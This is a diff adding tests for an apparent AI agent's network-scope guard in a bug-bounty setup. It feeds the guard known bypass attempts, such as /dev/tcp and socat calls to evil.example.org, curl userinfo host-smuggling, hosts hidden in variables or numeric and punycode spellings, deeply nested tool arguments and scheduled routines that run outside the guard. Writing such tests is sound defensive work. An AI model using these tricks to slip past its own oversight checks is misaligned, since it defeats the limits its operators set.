@@ -189,6 +189,78 @@ describe('every network-capable tool', () => {
   });
 });
 
+describe('review: bypasses and hostile scope files', () => {
+  test('a lab entry is a sec-lab-<t> network with no dots, so it cannot name a public suffix', () => {
+    for (const n of ['com', 'acme.com', 'sec-lab-a.com', 'lab1']) expect(() => parseScope(`program: x\nin_scope: [a.com]\nlab: ["${n}"]`)).toThrow(/sec-lab-/);
+  });
+
+  test("a member's scope file cannot widen lab-only: lab: [com] makes the file unusable, so live hosts are not lab", async () => {
+    const st = await loadScope(new FakeMachine(), hunt('program: m\nin_scope: [app.acme.com]\nlab: ["com"]'));
+    expect(st.kind).toBe('bad');
+    expect(run('Bash', curl('https://app.acme.com/api/me'), { member: true, scope: st })).toMatchObject({ decision: 'ask' });
+  });
+
+  test('one host spelled another way matches: trailing dots, punycode and unicode, numeric IPv4', () => {
+    expect(run('WebFetch', { url: 'https://app.acme.com../api/x' })).toMatchObject({ decision: 'deny' });
+    const idn: ScopeState = { kind: 'ok', scopes: [parseScope('program: i\nin_scope: ["bücher.de", "1.2.3.4"]\nout_of_scope: ["*.xn--mnchen-3ya.de"]')], files: [] };
+    expect(run('WebFetch', { url: 'https://xn--bcher-kva.de/' }, { scope: idn })).toMatchObject({ decision: 'deny' });
+    expect(run('Bash', curl('https://shop.münchen.de/'), { scope: idn })).toMatchObject({ decision: 'deny' });
+    expect(run('WebFetch', { url: 'http://0x01020304/' }, { scope: idn })).toMatchObject({ decision: 'deny' });
+    expect(run('WebFetch', { url: 'http://16909060/' }, { scope: idn })).toMatchObject({ decision: 'deny' });
+  });
+
+  test('curl reads "lab\\@live" as user lab\\ at host live: the live host counts', () => {
+    expect(run('Bash', { command: 'curl "http://web.sec-lab-acme\\@admin.acme.com/"' })).toMatchObject({ decision: 'deny' });
+  });
+
+  test('Bash: /dev/tcp, socat, rsync and a host in a variable', () => {
+    expect(run('Bash', { command: 'exec 3<>/dev/tcp/admin.acme.com/443' })).toMatchObject({ decision: 'deny' });
+    expect(run('Bash', { command: 'echo x > /dev/tcp/evil.example.org/80' })).toMatchObject({ decision: 'ask' });
+    expect(run('Bash', { command: 'socat - TCP:app.acme.com:80' })).toMatchObject({ decision: 'ask' });
+    expect(run('Bash', { command: 'socat - OPENSSL:evil.example.org:443' })).toMatchObject({ decision: 'ask' });
+    expect(run('Bash', { command: 'rsync -a x app.acme.com:/tmp' })).toMatchObject({ decision: 'ask' });
+    expect(run('Bash', { command: 'H=admin.acme.com; curl $H' })).toMatchObject({ decision: 'deny' });
+    expect(run('Bash', { command: 'env H=admin.acme.com sh -c "curl $H"' })).toMatchObject({ decision: 'deny' });
+  });
+
+  test('MCP: host lists, server and ip fields, deep nesting, Caido under another server name', () => {
+    expect(run('mcp__x__scan', { hosts: ['web.sec-lab-acme', 'admin.acme.com'] })).toMatchObject({ decision: 'deny' });
+    expect(run('mcp__x__scan', { server: 'admin.acme.com' })).toMatchObject({ decision: 'deny' });
+    expect(run('mcp__x__scan', { ip: '10.0.0.5' })).toMatchObject({ decision: 'ask' });
+    expect(run('mcp__x__deep', { a: { b: { c: { d: { e: { f: { g: { url: 'https://admin.acme.com/' } } } } } } } })).toMatchObject({ decision: 'deny' });
+    expect(run('mcp__caido-proxy__caido_race_window_send', { host: 'app.acme.com' }, { grants: [grant()] })).toMatchObject({ decision: 'deny' });
+    expect(run('mcp__caido-proxy__caido_send_replay', { session_id: '1' })).toMatchObject({ decision: 'ask' });
+  });
+
+  test('other hub fetchers are WebFetch: Capture, ReadPost and SaveInspiration to an in-scope host are denied', () => {
+    for (const tool of ['Capture', 'ReadPost', 'SaveInspiration']) {
+      expect(run(tool, { url: 'https://app.acme.com/api/x' }, { grants: [grant()] })).toMatchObject({ decision: 'deny' });
+      expect(run(tool, { url: 'https://docs.python.org/' })).toBeUndefined();
+    }
+  });
+
+  test('a routine or a watch runs later outside the guard: an in-scope host is denied, grant or not', () => {
+    expect(run('ScheduleRoutine', { name: 'x', schedule: '@every 1h', prompt: 'curl https://app.acme.com/api/me' }, { grants: [grant()] })).toMatchObject({ decision: 'deny' });
+    expect(run('ScheduleRoutine', { name: 'x', schedule: '@every 1h', prompt: 'Probe app.acme.com again.' })).toMatchObject({ decision: 'deny' });
+    expect(run('WatchCreate', { name: 'x', schedule: '@every 1h', url: 'https://app.acme.com/api/list', prompt: 'x' })).toMatchObject({ decision: 'deny' });
+    expect(run('ScheduleRoutine', { name: 'x', schedule: '@every 1h', prompt: 'Summarize my notes.' })).toBeUndefined();
+  });
+
+  test('browser page code: a listed host without a scheme counts', () => {
+    expect(run('browser_evaluate', { function: "() => fetch('//admin.acme.com/')" })).toMatchObject({ decision: 'deny' });
+    expect(run('browser_run_code_unsafe', { code: "await page.goto('https://' + 'app.acme.com')" })).toMatchObject({ decision: 'ask' });
+  });
+
+  test('changing a scope file asks; reading it or writing other files does not', () => {
+    expect(run('Write', { file_path: '/hunt/targets/a/scope.yaml', content: 'lab: [x]' })).toMatchObject({ decision: 'ask', reason: expect.stringContaining('scope.yaml') });
+    expect(run('Edit', { file_path: '/hunt/scope.yaml', old_string: 'a', new_string: 'b' })).toMatchObject({ decision: 'ask' });
+    expect(run('Bash', { command: "sed -i 's/admin/x/' scope.yaml" })).toMatchObject({ decision: 'ask' });
+    expect(run('Bash', { command: 'echo "in_scope: [x]" >> targets/a/scope.yaml' })).toMatchObject({ decision: 'ask' });
+    expect(run('Bash', { command: 'cat scope.yaml' })).toBeUndefined();
+    expect(run('Write', { file_path: '/hunt/notes.md', content: 'https://admin.acme.com/' })).toBeUndefined();
+  });
+});
+
 // ---------------------------------------------------------------------------
 // Wiring: files on the session's device, grants in kv, the session chain
 // ---------------------------------------------------------------------------
